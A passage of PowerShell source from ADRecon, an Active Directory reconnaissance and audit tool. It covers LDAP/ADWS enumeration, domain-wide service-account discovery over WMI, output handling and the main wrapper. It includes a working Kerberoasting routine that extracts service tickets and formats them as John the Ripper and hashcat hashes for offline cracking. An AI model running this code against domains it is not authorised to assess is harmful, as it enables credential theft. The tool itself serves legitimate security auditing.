                        $UserDomain = $_.DistinguishedName.SubString($_.DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        # JohnTheRipper output format
                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        # hashcat output format
                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.SamAccountName)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        $JTRHash = $null
                        $HashcatHash = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name "John" -Value $JTRHash
                    $Obj | Add-Member -MemberType NoteProperty -Name "Hashcat" -Value $HashcatHash
                    $UserSPNObj += $Obj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","samaccountname","serviceprincipalname","useraccountcontrol"))
        $ObjSearcher.SearchScope = "Subtree"
        Try
        {
            $ADUsers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRKerberoast] Error while enumerating UserSPN Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADUsers)
        {
            $UserSPNObj = @()
            $ADUsers | ForEach-Object {
                ForEach ($UserSPN in $_.Properties.serviceprincipalname)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name "Username" -Value $_.Properties.samaccountname[0]
                    $Obj | Add-Member -MemberType NoteProperty -Name "ServicePrincipalName" -Value $UserSPN

                    $HashObj = Get-ADRSPNTicket $UserSPN
                    If ($HashObj)
                    {
                        $UserDomain = $_.Properties.distinguishedname[0].SubString($_.Properties.distinguishedname[0].IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        # JohnTheRipper output format
                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        # hashcat output format
                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.Properties.samaccountname)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        $JTRHash = $null
                        $HashcatHash = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name "John" -Value $JTRHash
                    $Obj | Add-Member -MemberType NoteProperty -Name "Hashcat" -Value $HashcatHash
                    $UserSPNObj += $Obj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If ($LogonToken)
    {
        Get-ADRRevertToSelf -TokenHandle $LogonToken
    }

    If ($UserSPNObj)
    {
        Return $UserSPNObj
    }
    Else
    {
        Return $null
    }
}

# based on https://gallery.technet.microsoft.com/scriptcenter/PowerShell-script-to-find-6fc15ecb
Function Get-ADRDomainAccountsusedforServiceLogon
{
<#
.SYNOPSIS
    Returns all accounts used by services on computers in an Active Directory domain.

.DESCRIPTION
    Retrieves a list of all computers in the current domain and reads service configuration using Get-WmiObject.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    BEGIN {
        $readServiceAccounts = [scriptblock] {
            # scriptblock to retrieve service list form a remove machine
            $hostname = [string] $args[0]
            $OperatingSystem = [string] $args[1]
            #$Credential = [Management.Automation.PSCredential] $args[2]
            $Credential = $args[2]
            $timeout = 250
            $port = 135
            Try
            {
                $tcpclient = New-Object System.Net.Sockets.TcpClient
                $result = $tcpclient.BeginConnect($hostname,$port,$null,$null)
                $success = $result.AsyncWaitHandle.WaitOne($timeout,$null)
            }
            Catch
            {
                $warning = "$hostname ($OperatingSystem) is unreachable $($_.Exception.Message)"
                $success = $false
                $tcpclient.Close()
            }
            If ($success)
            {
                # PowerShellv2 does not support New-CimSession
                If ($PSVersionTable.PSVersion.Major -ne 2)
                {
                    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                    {
                        $session = New-CimSession -ComputerName $hostname -SessionOption $(New-CimSessionOption –Protocol DCOM) -Credential $Credential
                        If ($session)
                        {
                            $serviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession $session -ErrorAction Stop)
                        }
                    }
                    Else
                    {
                        $session = New-CimSession -ComputerName $hostname -SessionOption $(New-CimSessionOption –Protocol DCOM)
                        If ($session)
                        {
                            $serviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession $session -ErrorAction Stop )
                        }
                    }
                }
                Else
                {
                    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                    {
                        $serviceList = @( Get-WmiObject -Class Win32_Service -ComputerName $hostname -Credential $Credential -Impersonation 3 -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                    Else
                    {
                        $serviceList = @( Get-WmiObject -Class Win32_Service -ComputerName $hostname -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                }
                $serviceList
            }
            Try
            {
                If ($tcpclient) { $tcpclient.EndConnect($result) | Out-Null }
            }
            Catch
            {
                $warning = "$hostname ($OperatingSystem) : $($_.Exception.Message)"
            }
            $warning
        }

        Function processCompletedJobs()
        {
            # reads service list from completed jobs,
            # updates $serviceAccount table and removes completed job

            $jobs = Get-Job -State Completed
            ForEach( $job in $jobs )
            {
                If ($null -ne $job)
                {
                    $data = Receive-Job $job
                    Remove-Job $job
                }

                If ($data)
                {
                    If ( $data.GetType() -eq [Object[]] )
                    {
                        $serviceList = $data | Where-Object { if ($_.StartName) { $_ }}
                        $serviceList | ForEach-Object {
                            $Obj = New-Object PSObject
                            $Obj | Add-Member -MemberType NoteProperty -Name "Account" -Value $_.StartName
                            $Obj | Add-Member -MemberType NoteProperty -Name "Service Name" -Value $_.Name
                            $Obj | Add-Member -MemberType NoteProperty -Name "SystemName" -Value $_.SystemName
                            If ($_.StartName.toUpper().Contains($currentDomain))
                            {
                                $Obj | Add-Member -MemberType NoteProperty -Name "Running as Domain User" -Value $true
                            }
                            Else
                            {
                                $Obj | Add-Member -MemberType NoteProperty -Name "Running as Domain User" -Value $false
                            }
                            $script:serviceAccounts += $Obj
                        }
                    }
                    ElseIf ( $data.GetType() -eq [String] )
                    {
                        $script:warnings += $data
                        Write-Verbose $data
                    }
                }
            }
        }
    }

    PROCESS
    {
        $script:serviceAccounts = @()
        [string[]] $warnings = @()
        If ($Protocol -eq 'ADWS')
        {
            Try
            {
                $ADDomain = Get-ADDomain
            }
            Catch
            {
                Write-Warning "[Get-ADRDomainAccountsusedforServiceLogon] Error getting Domain Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            If ($ADDomain)
            {
                $currentDomain = $ADDomain.NetBIOSName.toUpper()
                Remove-Variable ADDomain
            }
            Else
            {
                $currentDomain = ""
                Write-Warning "Current Domain could not be retrieved."
            }

            Try
            {
                $ADComputers = Get-ADComputer -Filter { Enabled -eq $true -and OperatingSystem -Like "*Windows*" } -Properties Name,DNSHostName,OperatingSystem
            }
            Catch
            {
                Write-Warning "[Get-ADRDomainAccountsusedforServiceLogon] Error while enumerating Windows Computer Objects"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }

            If ($ADComputers)
            {
                # start data retrieval job for each server in the list
                # use up to $Threads threads
                $cnt = $([ADRecon.ADWSClass]::ObjectCount($ADComputers))
                Write-Verbose "[*] Total Windows Hosts: $cnt"
                $icnt = 0
                $ADComputers | ForEach-Object {
                    $StopWatch = [System.Diagnostics.StopWatch]::StartNew()
                    If( $_.dnshostname )
	                {
                        $args = @($_.DNSHostName, $_.OperatingSystem, $Credential)
		                Start-Job -ScriptBlock $readServiceAccounts -Name "read_$($_.name)" -ArgumentList $args | Out-Null
		                ++$icnt
		                If ($StopWatch.Elapsed.TotalMilliseconds -ge 1000)
                        {
                            Write-Progress -Activity "Retrieving data from servers" -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            $StopWatch.Reset()
                            $StopWatch.Start()
		                }
                        while ( ( Get-Job -State Running).count -ge $Threads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                # process remaining jobs

                Write-Progress -Activity "Retrieving data from servers" -Status "Waiting for background jobs to complete..." -PercentComplete 100
                Wait-Job -State Running -Timeout 30  | Out-Null
                Get-Job -State Running | Stop-Job
                processCompletedJobs
                Write-Progress -Activity "Retrieving data from servers" -Completed -Status "All Done"
            }
        }

        If ($Protocol -eq 'LDAP')
        {
            $currentDomain = ([string]($objDomain.name)).toUpper()

            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = "(&(samAccountType=805306369)(!userAccountControl:1.2.840.113556.1.4.803:=2)(operatingSystem=*Windows*))"
            $ObjSearcher.PropertiesToLoad.AddRange(("name","dnshostname","operatingsystem"))
            $ObjSearcher.SearchScope = "Subtree"

            Try
            {
                $ADComputers = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning "[Get-ADRDomainAccountsusedforServiceLogon] Error while enumerating Windows Computer Objects"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            $ObjSearcher.dispose()

            If ($ADComputers)
            {
                # start data retrieval job for each server in the list
                # use up to $Threads threads
                $cnt = $([ADRecon.LDAPClass]::ObjectCount($ADComputers))
                Write-Verbose "[*] Total Windows Hosts: $cnt"
                $icnt = 0
                $ADComputers | ForEach-Object {
                    If( $_.Properties.dnshostname )
	                {
                        $args = @($_.Properties.dnshostname, $_.Properties.operatingsystem, $Credential)
		                Start-Job -ScriptBlock $readServiceAccounts -Name "read_$($_.Properties.name)" -ArgumentList $args | Out-Null
		                ++$icnt
		                If ($StopWatch.Elapsed.TotalMilliseconds -ge 1000)
                        {
		                    Write-Progress -Activity "Retrieving data from servers" -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            $StopWatch.Reset()
                            $StopWatch.Start()
		                }
		                while ( ( Get-Job -State Running).count -ge $Threads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                # process remaining jobs
                Write-Progress -Activity "Retrieving data from servers" -Status "Waiting for background jobs to complete..." -PercentComplete 100
                Wait-Job -State Running -Timeout 30  | Out-Null
                Get-Job -State Running | Stop-Job
                processCompletedJobs
                Write-Progress -Activity "Retrieving data from servers" -Completed -Status "All Done"
            }
        }

        If ($script:serviceAccounts)
        {
            Return $script:serviceAccounts
        }
        Else
        {
            Return $null
        }
    }
}

Function Remove-EmptyADROutputDir
{
<#
.SYNOPSIS
    Removes ADRecon output folder if empty.

.DESCRIPTION
    Removes ADRecon output folder if empty.

.PARAMETER ADROutputDir
    [string]
	Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $true)]
        [array] $OutputType
    )

    Switch ($OutputType)
    {
        'CSV'
        {
            $CSVPath  = -join($ADROutputDir,'\','CSV-Files')
            If (!(Test-Path -Path $CSVPath\*))
            {
                Write-Verbose "Removed Empty Directory $CSVPath"
                Remove-Item $CSVPath
            }
        }
        'XML'
        {
            $XMLPath  = -join($ADROutputDir,'\','XML-Files')
            If (!(Test-Path -Path $XMLPath\*))
            {
                Write-Verbose "Removed Empty Directory $XMLPath"
                Remove-Item $XMLPath
            }
        }
        'JSON'
        {
            $JSONPath  = -join($ADROutputDir,'\','JSON-Files')
            If (!(Test-Path -Path $JSONPath\*))
            {
                Write-Verbose "Removed Empty Directory $JSONPath"
                Remove-Item $JSONPath
            }
        }
        'HTML'
        {
            $HTMLPath  = -join($ADROutputDir,'\','HTML-Files')
            If (!(Test-Path -Path $HTMLPath\*))
            {
                Write-Verbose "Removed Empty Directory $HTMLPath"
                Remove-Item $HTMLPath
            }
        }
    }
    If (!(Test-Path -Path $ADROutputDir\*))
    {
        Remove-Item $ADROutputDir
        Write-Verbose "Removed Empty Directory $ADROutputDir"
    }
}

Function Get-ADRAbout
{
<#
.SYNOPSIS
    Returns information about ADRecon.

.DESCRIPTION
    Returns information about ADRecon.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER date
    [DateTime]
    Date

.PARAMETER ADReconVersion
    [string]
    ADRecon Version.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER RanonComputer
    [string]
    Details of the Computer running ADRecon.

.PARAMETER TotalTime
    [string]
    TotalTime.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $true)]
        [string] $ADReconVersion,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [string] $RanonComputer,

        [Parameter(Mandatory = $true)]
        [string] $TotalTime
    )

    $AboutADRecon = @()

    If ($Protocol -eq 'ADWS')
    {
        $Version = "RSAT Version"
    }
    Else
    {
        $Version = "LDAP Version"
    }

    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
    {
        $Username = $($Credential.UserName)
    }
    Else
    {
        $Username = $([Environment]::UserName)
    }

    $ObjValues = @("Date", $($date), "ADRecon", "https://github.com/sense-of-security/ADRecon", $Version, $($ADReconVersion), "Ran as user", $Username, "Ran on computer", $RanonComputer, "Execution Time (mins)", $($TotalTime))

    For ($i = 0; $i -lt $($ObjValues.Count); $i++)
    {
        $Obj = New-Object PSObject
        $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value $ObjValues[$i]
        $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
        $i++
        $AboutADRecon += $Obj
    }
    Return $AboutADRecon
}

Function Invoke-ADRecon
{
<#
.SYNOPSIS
    Wrapper function to run ADRecon modules.

.DESCRIPTION
    Wrapper function to set variables, check dependencies and run ADRecon modules.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER Collect
    [array]
    Which modules to run; Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, OUs, GPOs, gPLinks, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, GPOReport, Kerberoast, DomainAccountsusedforServiceLogon.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER OutputDir
    [string]
	Path for ADRecon output folder to save the CSV files and the ADRecon-Report.xlsx.

.PARAMETER DormantTimeSpan
    [int]
    Timespan for Dormant accounts. Default 90 days.

.PARAMTER PassMaxAge
    [int]
    Maximum machine account password age. Default 30 days

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER UseAltCreds
    [bool]
    Whether to use provided credentials or not.

.OUTPUTS
    STDOUT, CSV, XML, JSON, HTML and/or Excel file is created in the folder specified with the information.
#>
    param(
        [Parameter(Mandatory = $false)]
        [string] $GenExcel,

        [Parameter(Mandatory = $false)]
        [ValidateSet('ADWS', 'LDAP')]
        [string] $Protocol = 'ADWS',

        [Parameter(Mandatory = $true)]
        [array] $Collect,

        [Parameter(Mandatory = $false)]
        [string] $DomainController = '',

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [array] $OutputType,

        [Parameter(Mandatory = $false)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $false)]
        [int] $DormantTimeSpan = 90,

        [Parameter(Mandatory = $false)]
        [int] $PassMaxAge = 30,

        [Parameter(Mandatory = $false)]
        [int] $PageSize = 200,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10,

        [Parameter(Mandatory = $false)]
        [bool] $UseAltCreds = $false
    )

    [string] $ADReconVersion = "v1.1"
    Write-Output "[*] ADRecon $ADReconVersion by Prashant Mahajan (@prashant3535)"

    If ($GenExcel)
    {
        If (!(Test-Path $GenExcel))
        {
            Write-Output "[Invoke-ADRecon] Invalid Path ... Exiting"
            Return $null
        }
        Export-ADRExcel -ExcelPath $GenExcel
        Return $null
    }

    # Suppress verbose output
    $SaveVerbosePreference = $script:VerbosePreference
    $script:VerbosePreference = 'SilentlyContinue'
    Try
    {
        If ($PSVersionTable.PSVersion.Major -ne 2)
        {
            $computer = Get-CimInstance -ClassName Win32_ComputerSystem
            $computerdomainrole = ($computer).DomainRole
        }
        Else
        {
            $computer = Get-WMIObject win32_computersystem
            $computerdomainrole = ($computer).DomainRole
        }
    }
    Catch
    {
        Write-Output "[Invoke-ADRecon] $($_.Exception.Message)"
    }
    If ($SaveVerbosePreference)
    {
        $script:VerbosePreference = $SaveVerbosePreference
        Remove-Variable SaveVerbosePreference
    }

    switch ($computerdomainrole)
    {
        0
        {
            [string] $computerrole = "Standalone Workstation"
            $Env:ADPS_LoadDefaultDrive = 0
            $UseAltCreds = $true
        }
        1 { [string] $computerrole = "Member Workstation" }
        2
        {
            [string] $computerrole = "Standalone Server"
            $UseAltCreds = $true
            $Env:ADPS_LoadDefaultDrive = 0
        }
        3 { [string] $computerrole = "Member Server" }
        4 { [string] $computerrole = "Backup Domain Controller" }
        5 { [string] $computerrole = "Primary Domain Controller" }
        default { Write-Output "Computer Role could not be identified." }
    }

    $RanonComputer = "$($computer.domain)\$([Environment]::MachineName) - $($computerrole)"
    Remove-Variable computer
    Remove-Variable computerdomainrole
    Remove-Variable computerrole

    # If either DomainController or Credentials are provided, treat as non-member
    If (($DomainController -ne "") -or ($Credential -ne [Management.Automation.PSCredential]::Empty))
    {
        # Disable loading of default drive on member
        If (($Protocol -eq 'ADWS') -and (-Not $UseAltCreds))
        {
            $Env:ADPS_LoadDefaultDrive = 0
        }
        $UseAltCreds = $true
    }

    # Import ActiveDirectory module
    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            # Suppress verbose output on module import
            $SaveVerbosePreference = $script:VerbosePreference;
            $script:VerbosePreference = 'SilentlyContinue';
            Import-Module ActiveDirectory -WarningAction Stop -ErrorAction Stop | Out-Null
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
        }
        Catch
        {
            Write-Warning "[Invoke-ADRecon] Error importing ActiveDirectory Module from RSAT (Remote Server Administration Tools) ... Continuing with LDAP"
            $Protocol = 'LDAP'
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
    }

    # Compile C# code
    # Suppress Debug output
    $SaveDebugPreference = $script:DebugPreference
    $script:DebugPreference = 'SilentlyContinue'
    Try
    {
        $Advapi32 = Add-Type -MemberDefinition $Advapi32Def -Name "Advapi32" -Namespace ADRecon -PassThru
        $Kernel32 = Add-Type -MemberDefinition $Kernel32Def -Name "Kernel32" -Namespace ADRecon -PassThru
        Add-Type -TypeDefinition $PingCastleSMBScannerSource
        $CLR = ([System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion)[1]
        If ($Protocol -eq 'ADWS')
        {
            If ($CLR -eq "4")
            {
                Add-Type -TypeDefinition $ADWSSource -ReferencedAssemblies ([System.String[]]@(([System.Reflection.Assembly]::LoadWithPartialName("Microsoft.ActiveDirectory.Management")).Location,([System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices")).Location))
            }
            Else
            {
                Add-Type -TypeDefinition $ADWSSource -ReferencedAssemblies ([System.String[]]@(([System.Reflection.Assembly]::LoadWithPartialName("Microsoft.ActiveDirectory.Management")).Location,([System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices")).Location)) -Language CSharpVersion3
            }
        }

        If ($Protocol -eq 'LDAP')
        {
            If ($CLR -eq "4")
            {
                Add-Type -TypeDefinition $LDAPSource -ReferencedAssemblies ([System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices")).Location
            }
            Else
            {
                Add-Type -TypeDefinition $LDAPSource -ReferencedAssemblies ([System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices")).Location -Language CSharpVersion3
            }
        }
    }
    Catch
    {
        Write-Output "[Invoke-ADRecon] $($_.Exception.Message)"
        Return $null
    }
    If ($SaveDebugPreference)
    {
        $script:DebugPreference = $SaveDebugPreference
        Remove-Variable SaveDebugPreference
    }

    # Allow running using RUNAS from a non-domain joined machine
    # runas /user:<Domain FQDN>\<Username> /netonly powershell.exe
    If (($Protocol -eq 'LDAP') -and ($UseAltCreds) -and ($DomainController -eq "") -and ($Credential -eq [Management.Automation.PSCredential]::Empty))
    {
        Try
        {
            $objDomain = [ADSI]""
            If(!($objDomain.name))
            {
                Write-Verbose "[Invoke-ADRecon] RUNAS Check, LDAP bind Unsuccessful"
            }
            $UseAltCreds = $false
            $objDomain.Dispose()
        }
        Catch
        {
            $UseAltCreds = $true
        }
    }

    If ($UseAltCreds -and (($DomainController -eq "") -or ($Credential -eq [Management.Automation.PSCredential]::Empty)))
    {

        If (($DomainController -ne "") -and ($Credential -eq [Management.Automation.PSCredential]::Empty))
        {
            Try
            {
                $Credential = Get-Credential
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message)"
                Return $null
            }
        }
        Else
        {
            Write-Output "Run Get-Help .\ADRecon.ps1 -Examples for additional information."
            Write-Output "[Invoke-ADRecon] Use the -DomainController and -Credential parameter."`n
            Return $null
        }
    }

    Write-Output "[*] Running on $RanonComputer"

    Switch ($Collect)
    {
        'Forest' { $ADRForest = $true }
        'Domain' {$ADRDomain = $true }
        'Trusts' { $ADRTrust = $true }
        'Sites' { $ADRSite = $true }
        'Subnets' { $ADRSubnet = $true }
        'PasswordPolicy' { $ADRPasswordPolicy = $true }
        'FineGrainedPasswordPolicy' { $ADRFineGrainedPasswordPolicy = $true }
        'DomainControllers' { $ADRDomainControllers = $true }
        'Users' { $ADRUsers = $true }
        'UserSPNs' { $ADRUserSPNs = $true }
        'PasswordAttributes' { $ADRPasswordAttributes = $true }
        'Groups' { $ADRGroups = $true }
        'GroupMembers' { $ADRGroupMembers = $true }
        'OUs' { $ADROUs = $true }
        'GPOs' { $ADRGPOs = $true }
        'gPLinks' { $ADRgPLinks = $true }
        'DNSZones' { $ADRDNSZones = $true }
        'Printers' { $ADRPrinters = $true }
        'Computers' { $ADRComputers = $true }
        'ComputerSPNs' { $ADRComputerSPNs = $true }
        'LAPS' { $ADRLAPS = $true }
        'BitLocker' { $ADRBitLocker = $true }
        'ACLs' { $ADRACLs = $true }
        'GPOReport'
        {
            $ADRGPOReport = $true
            $ADRCreate = $true
        }
        'Kerberoast' { $ADRKerberoast = $true }
        'DomainAccountsusedforServiceLogon' { $ADRDomainAccountsusedforServiceLogon = $true }
        'Default'
        {
            $ADRForest = $true
            $ADRDomain = $true
            $ADRTrust = $true
            $ADRSite = $true
            $ADRSubnet = $true
            $ADRPasswordPolicy = $true
            $ADRFineGrainedPasswordPolicy = $true
            $ADRDomainControllers = $true
            $ADRUsers = $true
            $ADRUserSPNs = $true
            $ADRPasswordAttributes = $true
            $ADRGroups = $true
            $ADRGroupMembers = $true
            $ADROUs = $true
            $ADRGPOs = $true
            $ADRgPLinks = $true
            $ADRDNSZones = $true
            $ADRPrinters = $true
            $ADRComputers = $true
            $ADRComputerSPNs = $true
            $ADRLAPS = $true
            $ADRBitLocker = $true
            $ADRACLs = $true
            $ADRGPOReport = $true
            #$ADRKerberoast = $true
            #$ADRDomainAccountsusedforServiceLogon = $true
            If ($OutputType -eq "Default")
            {
                [array] $OutputType = "CSV","Excel"
            }
        }
    }

    Switch ($OutputType)
    {
        'STDOUT' { $ADRSTDOUT = $true }
        'CSV'
        {
            $ADRCSV = $true
            $ADRCreate = $true
        }
        'XML'
        {
            $ADRXML = $true
            $ADRCreate = $true
        }
        'JSON'
        {
            $ADRJSON = $true
            $ADRCreate = $true
        }
        'HTML'
        {
            $ADRHTML = $true
            $ADRCreate = $true
        }
        'Excel'
        {
            $ADRExcel = $true
            $ADRCreate = $true
        }
        'All'
        {
            #$ADRSTDOUT = $true
            $ADRCSV = $true
            $ADRXML = $true
            $ADRJSON = $true
            $ADRHTML = $true
            $ADRExcel = $true
            $ADRCreate = $true
            [array] $OutputType = "CSV","XML","JSON","HTML","Excel"
        }
        'Default'
        {
            [array] $OutputType = "STDOUT"
            $ADRSTDOUT = $true
        }
    }

    If ( ($ADRExcel) -and (-Not $ADRCSV) )
    {
        $ADRCSV = $true
        [array] $OutputType += "CSV"
    }

    $returndir = Get-Location
    $date = Get-Date

    # Create Output dir
    If ( ($ADROutputDir) -and ($ADRCreate) )
    {
        If (!(Test-Path $ADROutputDir))
        {
            New-Item $ADROutputDir -type directory | Out-Null
            If (!(Test-Path $ADROutputDir))
            {
                Write-Output "[Invoke-ADRecon] Error, invalid OutputDir Path ... Exiting"
                Return $null
            }
        }
        $ADROutputDir = $((Convert-Path $ADROutputDir).TrimEnd("\"))
        Write-Verbose "[*] Output Directory: $ADROutputDir"
    }
    ElseIf ($ADRCreate)
    {
        $ADROutputDir =  -join($returndir,'\','ADRecon-Report-',$(Get-Date -UFormat %Y%m%d%H%M%S))
        New-Item $ADROutputDir -type directory | Out-Null
        If (!(Test-Path $ADROutputDir))
        {
            Write-Output "[Invoke-ADRecon] Error, could not create output directory"
            Return $null
        }
        $ADROutputDir = $((Convert-Path $ADROutputDir).TrimEnd("\"))
        Remove-Variable ADRCreate
    }
    Else
    {
        $ADROutputDir = $returndir
    }

    If ($ADRCSV)
    {
        $CSVPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\','CSV-Files')
        New-Item $CSVPath -type directory | Out-Null
        If (!(Test-Path $CSVPath))
        {
            Write-Output "[Invoke-ADRecon] Error, could not create output directory"
            Return $null
        }
        Remove-Variable ADRCSV
    }

    If ($ADRXML)
    {
        $XMLPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\','XML-Files')
        New-Item $XMLPath -type directory | Out-Null
        If (!(Test-Path $XMLPath))
        {
            Write-Output "[Invoke-ADRecon] Error, could not create output directory"
            Return $null
        }
        Remove-Variable ADRXML
    }

    If ($ADRJSON)
    {
        $JSONPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\','JSON-Files')
        New-Item $JSONPath -type directory | Out-Null
        If (!(Test-Path $JSONPath))
        {
            Write-Output "[Invoke-ADRecon] Error, could not create output directory"
            Return $null
        }
        Remove-Variable ADRJSON
    }

    If ($ADRHTML)
    {
        $HTMLPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\','HTML-Files')
        New-Item $HTMLPath -type directory | Out-Null
        If (!(Test-Path $HTMLPath))
        {
            Write-Output "[Invoke-ADRecon] Error, could not create output directory"
            Return $null
        }
        Remove-Variable ADRHTML
    }

    # AD Login
    If ($UseAltCreds -and ($Protocol -eq 'ADWS'))
    {
        If (!(Test-Path ADR:))
        {
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root "" -Server $DomainController -Credential $Credential -ErrorAction Stop | Out-Null
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message)"
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Else
        {
            Remove-PSDrive ADR
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root "" -Server $DomainController -Credential $Credential -ErrorAction Stop | Out-Null
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message)"
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Set-Location ADR:
        Write-Debug "ADR PSDrive Created"
    }

    If ($Protocol -eq 'LDAP')
    {
        If ($UseAltCreds)
        {
            Try
            {
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objDomainRootDSE = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/RootDSE", $Credential.UserName,$Credential.GetNetworkCredential().Password
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message)"
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
            If(!($objDomain.name))
            {
                Write-Output "[Invoke-ADRecon] LDAP bind Unsuccessful"
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
            Else
            {
